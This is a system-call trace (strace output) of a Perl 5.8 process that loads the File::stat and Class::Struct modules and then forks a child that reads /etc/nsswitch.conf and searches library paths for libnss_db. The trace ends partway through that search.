9851  20:00:43.901422 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
9851  20:00:43.901852 stat64("/etc/perl/Class/Struct.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.901871 stat64("/etc/perl/Class/Struct.pm", 0xbf9ef4fc) = -1 ENOENT (No such file or directory)
9851  20:00:43.901885 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.901899 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbf9ef4fc) = -1 ENOENT (No such file or directory)
9851  20:00:43.901924 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.901938 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbf9ef4fc) = -1 ENOENT (No such file or directory)
9851  20:00:43.901952 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.901965 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbf9ef4fc) = -1 ENOENT (No such file or directory)
9851  20:00:43.901979 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.901991 stat64("/usr/share/perl5/Class/Struct.pm", 0xbf9ef4fc) = -1 ENOENT (No such file or directory)
9851  20:00:43.902005 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.902018 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbf9ef4fc) = -1 ENOENT (No such file or directory)
9851  20:00:43.902037 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.902051 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
9851  20:00:43.902073 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
9851  20:00:43.902088 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef308) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.902100 _llseek(10, 0, [0], SEEK_CUR) = 0
9851  20:00:43.902119 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
9851  20:00:43.902522 brk(0x82de000)    = 0x82de000
9851  20:00:43.902874 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
9851  20:00:43.903525 _llseek(10, 6916, [6916], SEEK_SET) = 0
9851  20:00:43.903543 _llseek(10, 0, [6916], SEEK_CUR) = 0
9851  20:00:43.903554 close(10)         = 0
9851  20:00:43.903736 _llseek(8, 1334, [1334], SEEK_SET) = 0
9851  20:00:43.903752 _llseek(8, 0, [1334], SEEK_CUR) = 0
9851  20:00:43.903763 close(8)          = 0
9851  20:00:43.904406 brk(0x82ff000)    = 0x82ff000
9851  20:00:43.904565 _llseek(6, 2689, [2689], SEEK_SET) = 0
9851  20:00:43.904582 _llseek(6, 0, [2689], SEEK_CUR) = 0
9851  20:00:43.904593 close(6)          = 0
9851  20:00:43.904747 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e00908) = 9852
9852  20:00:44.358789 getppid()         = 9851
9852  20:00:44.359320 open("/etc/nsswitch.conf", O_RDONLY) = 6
9852  20:00:44.469255 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
9852  20:00:44.469283 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc6000
9852  20:00:44.469299 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
9852  20:00:44.469352 read(6, "", 4096) = 0
9852  20:00:44.469363 close(6)          = 0
9852  20:00:44.469374 munmap(0xb7fc6000, 4096) = 0
9852  20:00:44.469406 open("/etc/ld.so.cache", O_RDONLY) = 6
9852  20:00:44.469421 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
9852  20:00:44.469438 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7dcd000
9852  20:00:44.469450 close(6)          = 0
9852  20:00:44.469462 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9852  20:00:44.469481 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469495 stat64("/lib/tls/i686/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.469510 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469524 stat64("/lib/tls/i686/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.469536 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469549 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9852  20:00:44.469567 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469590 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9852  20:00:44.469674 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469687 stat64("/lib/tls/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.469699 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469711 stat64("/lib/tls/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.469722 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469735 stat64("/lib/tls/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.469746 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469758 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9852  20:00:44.469775 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469787 stat64("/lib/i686/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.469798 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469810 stat64("/lib/i686/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.469822 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469833 stat64("/lib/i686/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.469845 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469857 stat64("/lib/i686", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.469867 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469880 stat64("/lib/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.469891 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469902 stat64("/lib/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.469913 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469925 stat64("/lib/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.469936 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469947 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9852  20:00:44.469964 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.469977 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.469989 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470002 stat64("/usr/lib/tls/i686/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470014 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470026 stat64("/usr/lib/tls/i686/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470038 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470051 stat64("/usr/lib/tls/i686", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470062 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470081 stat64("/usr/lib/tls/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470117 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470144 stat64("/usr/lib/tls/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470155 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470167 stat64("/usr/lib/tls/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470179 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470194 stat64("/usr/lib/tls", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470206 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470225 stat64("/usr/lib/i686/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470237 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470249 stat64("/usr/lib/i686/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470261 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470273 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9852  20:00:44.470291 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470303 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9852  20:00:44.470320 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470333 stat64("/usr/lib/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470344 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470356 stat64("/usr/lib/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470367 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470380 stat64("/usr/lib/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470391 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470402 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
9852  20:00:44.470419 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470433 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470446 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470460 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470472 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470486 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470498 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470511 stat64("/lib/i486-linux-gnu/tls/i686", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470523 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470537 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470549 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470562 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470581 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470595 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470608 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470620 stat64("/lib/i486-linux-gnu/tls", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470632 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470646 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470658 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470675 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470687 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470700 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470712 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470725 stat64("/lib/i486-linux-gnu/i686", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470737 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470750 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470763 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470775 stat64("/lib/i486-linux-gnu/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470787 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470800 stat64("/lib/i486-linux-gnu/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470812 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470824 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9852  20:00:44.470842 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470856 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470869 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470883 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470896 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
9852  20:00:44.470910 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbf9efe8c) = -1 ENOENT (No such file or directory)
9852  20:00:44.470923 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
